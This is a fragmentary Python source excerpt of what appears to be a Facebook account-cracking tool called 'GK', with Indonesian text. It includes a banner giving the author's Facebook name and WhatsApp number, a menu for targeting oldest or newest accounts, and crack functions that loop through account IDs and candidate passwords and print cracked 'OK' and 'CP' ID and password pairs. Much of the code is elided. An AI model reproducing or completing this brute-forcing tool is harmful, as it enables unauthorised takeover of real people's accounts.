...
\33[1;32m╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝░╚═════╝░╚═════╝░
\33[1;33m█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
\33[1;33m█  \33[mGithub: Cooming soon
\33[1;33m█  \33[mFacebook: GK KING
\33[1;33m█  \33[mWhatsApp: 03183134979
...
def login_kontol():
	...
	try:
		...
		print("""%s ●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬● """%(h))
		print("""%s \33[1;96mJalan kan perintah python GK.py """%(h))
		time.sleep(2.5)
		exit()
	except KeyError:
		print("""%s \n"""%(h))
...
def setting():
	print("""%s ●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬● """%(h))
	print("""%s \33[m[0🤓1] \33[1;32mAKUN TERTUA"""%(h))
	print("""%s \33[m[0😘2] \33[1;32mAKUN TERMUDA """%(h))
	print("""%s ●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬● """%(h))
...
def crack(idf,pwv):
	...
	fff = '%'
	print('\r%s [GK] %s/%s ~_~ [OK:%s] ^_^ [CP:%s] ~_~ %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					print('\n')
					print(f"\33[1;33m╚══[CP GK]\33[1;33m{idf}\33[m•\33[1;33m{pw}\n")
					cp+=1
				break
				...
				if 'no' in taplikasi:
					...
					print('\n')
					print(f"\33[1;32m╚══[OK GK]\33[1;96m{idf}\33[m•\33[1;96m{pw}\n")
					break
...
def crack2(idf,pwv):
	...
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%s [GK] %s/%s ~_~ [OK*%s | CP*%s ~_~ %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
